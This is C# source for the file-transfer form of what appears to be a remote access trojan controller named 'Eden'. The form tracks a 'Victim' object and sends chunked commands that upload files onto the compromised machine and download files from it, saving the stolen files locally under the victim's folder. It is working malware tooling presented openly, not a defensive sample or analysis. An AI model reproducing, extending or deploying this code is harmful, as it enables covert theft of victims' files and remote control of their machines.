using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileTransfer : Form
    {
        private Victim m_victim;
        private Client m_clnt;
        public string m_szVictimID;

        private string m_szCurrentDir { get; set; }

        private List<string> m_lszFilePath { get; set; }
        private TransferFileType m_transferType { get; set; }

        private Queue<clsTransferFileHandler> m_qTransferFile = new Queue<clsTransferFileHandler>();
        private Dictionary<string, clsTransferFileHandler> m_dicTransferFile = new Dictionary<string, clsTransferFileHandler>();
        private int m_nChunkSize = 1024 * 5;
        private bool m_bPause { get; set; }
        private bool m_bStop { get; set; }

        private int m_nThreadCnt { get; set; }

        private object m_objLock = new object();

        public frmFileTransfer(Victim victim, string szCurrentDir, List<string> lszFilePath, TransferFileType transferType)
        {
            InitializeComponent();

            m_victim = victim;
            m_szVictimID = victim.m_szID;

            m_szCurrentDir = szCurrentDir;

            m_lszFilePath = lszFilePath;
            m_transferType = transferType;
        }

        void fnSrvRecv(Client clnt, string szVictimID, string[] aszMsg)
        {
            if (szVictimID != m_victim.m_szID)
                return;

            try
            {
                if (aszMsg[0] == "file")
                {
                    if (aszMsg[1] == "uf")
                    {
                        if (aszMsg[2] == "write")
                        {
                            int nIndex = int.Parse(aszMsg[3]);
                            int nTotalSize = int.Parse(aszMsg[4]);
                            string szFilePath = aszMsg[5];
                            int nCode = int.Parse(aszMsg[6]);
                            string szMsg = EZCrypto.Encoder.b64d2str(aszMsg[7]);

                            if (nCode == 0)
                            {
                                MessageBox.Show(szMsg, "Upload File", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return;
                            }

                            if (!m_dicTransferFile.ContainsKey(szFilePath))
                                return;

                            clsTransferFileHandler handler = m_dicTransferFile[szFilePath];
                            fnUpdateProgress(handler, nIndex);

                            if (handler.fnbIsDone())
                            {
                                if (m_qTransferFile.Count == 0)
                                    return;

                                handler = m_qTransferFile.Dequeue();
                                string szDestFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(handler.m_szRemoteFilePath)).Replace("\\", "/");
                                fnSendNextChunk(handler, szDestFilePath);
                            }
                            else
                            {
                                fnSendNextChunk(handler, szFilePath);
                            }
                        }
                    }
                    else if (aszMsg[1] == "df")
                    {
                        string szFilePath = aszMsg[2];
                        int nIndex = int.Parse(aszMsg[3]);
                        long nFileSize = long.Parse(aszMsg[4]);
                        byte[] abBuffer = Convert.FromBase64String(EZCrypto.Encoder.b64d2str(aszMsg[5]));

                        if (m_dicTransferFile.ContainsKey(szFilePath))
                        {
                            var handler = m_dicTransferFile[szFilePath];
                            handler.m_nFileSize = nFileSize;
                            handler.m_nChunkSize = m_nChunkSize;
                            handler.fnbWriteChunk(nIndex, abBuffer);

                            fnUpdateProgress(handler, nIndex);

                            if (handler.fnbIsDone())
                            {
                                if (m_qTransferFile.Count == 0)
                                    return;

                                handler = m_qTransferFile.Dequeue();
                                fnReadNextChunk(handler);
                            }
                            else
                            {
                                fnReadNextChunk(handler);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        void fnWriteLog(string szMsg)
        {
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
            richTextBox1.AppendText(Environment.NewLine);
        }

        void fnUpdateProgress(clsTransferFileHandler handler, int nIndex)
        {
            Invoke(new Action(() =>
            {
                double dProgress = (double)(handler.m_nIndex / handler.fnGetChunkCount()) * 100;
                ListViewItem item = listView1.FindItemWithText(handler.m_szRemoteFilePath, true, 0);

                if (handler.fnbIsDone())
                {
                    item.SubItems[2].Text = "OK";
                    handler.fnClose();
                }
                else
                {
                    if (item.SubItems[2].Text != "OK")
                        item.SubItems[2].Text = ((double)nIndex / handler.fnGetChunkCount() * 100).ToString("F2") + " %";
                }
            }));
        }

        void fnSendNextChunk(clsTransferFileHandler handler, string szFilePath)
        {
            int nRead = 0;
            byte[] abBuffer = new byte[m_nChunkSize];
            int nIndex = 0;

            (nRead, nIndex, abBuffer) = handler.fnabGetChunk();
            if (nRead == 0)
            {
                handler.fnClose();
                return;
            }

            m_victim.fnSendCommand(string.Join("|", new string[]
            {
                "File",
                "uf",
                "write",
                szFilePath,
                nIndex.ToString(),
                m_nChunkSize.ToString(),
                "0",
                EZCrypto.Encoder.stre2b64(Convert.ToBase64String(abBuffer)),
            }), false);
        }
        void fnReadNextChunk(clsTransferFileHandler handler)
        {
            m_victim.fnSendCommand(string.Join("|", new string[]
            {
                "File",
                "df",
                "read",
                handler.m_nIndex.ToString(),
                m_nChunkSize.ToString(),
                handler.m_szRemoteFilePath,
            }));
        }

        void fnStartTransfer(Queue<clsTransferFileHandler> qTransfer)
        {
            var handler = qTransfer.Dequeue();

            if (m_transferType == TransferFileType.UploadFile)
            {
                int nRead = 0;
                byte[] abBuffer = new byte[m_nChunkSize];
                int nIndex = 0;

                string szDestFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(handler.m_szRemoteFilePath)).Replace("\\", "/");

                try
                {
                    (nRead, nIndex, abBuffer) = handler.fnabGetChunk();
                    if (nRead == 0)
                        return;

                    m_victim.fnSendCommand(string.Join("|", new string[]
                    {
                        "File",
                        "uf",
                        "write",
                        szDestFilePath,
                        nIndex.ToString(),
                        m_nChunkSize.ToString(),
                        "0",
                        EZCrypto.Encoder.stre2b64(Convert.ToBase64String(abBuffer)),
                    }), false);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
            else
            {
                m_victim.fnSendCommand(string.Join("|", new string[]
                {
                    "File",
                    "df",
                    "read",
                    handler.m_nIndex.ToString(),
                    m_nChunkSize.ToString(),
                    handler.m_szRemoteFilePath,
                }));
            }
        }

        void fnSetup()
        {
            //Events
            m_victim.m_clnt.ServerMessageReceived += fnSrvRecv;

            //ListView init
            foreach (string szFilePath in m_lszFilePath)
            {
                ListViewItem item = new ListViewItem(Path.GetFileName(szFilePath));
                item.SubItems.Add(szFilePath);
                item.SubItems.Add("?");

                listView1.Items.Add(item);

                string szSaveDirPath = Path.Combine(new string[] { m_victim.m_szDirectory, "File" });
                if (!Directory.Exists(szSaveDirPath))
                    Directory.CreateDirectory(szSaveDirPath);

                string szLocalFilePath = string.Empty;
                if (m_transferType == TransferFileType.UploadFile)
                    szLocalFilePath = szFilePath;
                else
                    szLocalFilePath = Path.Combine(szSaveDirPath, Path.GetFileName(szFilePath));

                string szRemoteFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(szFilePath)).Replace("\\", "/");

                var handler = new clsTransferFileHandler(m_transferType, szLocalFilePath, szRemoteFilePath);

                m_qTransferFile.Enqueue(handler);
                m_dicTransferFile[szRemoteFilePath] = handler;
            }

            //Start
            Task.Run(new Action(() => fnStartTransfer(m_qTransferFile)));
        }

        private void frmFileTransfer_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Folder
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Process.Start("start", m_victim.m_szDirectory);
        }

        private void frmFileTransfer_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnSrvRecv;

            foreach (string szFileName in m_dicTransferFile.Keys)
            {
                var handler = m_dicTransferFile[szFileName];
                handler.fnClose();
            }
        }

        //Pause
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            m_bPause = true;
        }
        //Resume
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            m_bPause = false;
        }
        //Stop
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            m_bStop = true;
        }
    }
}
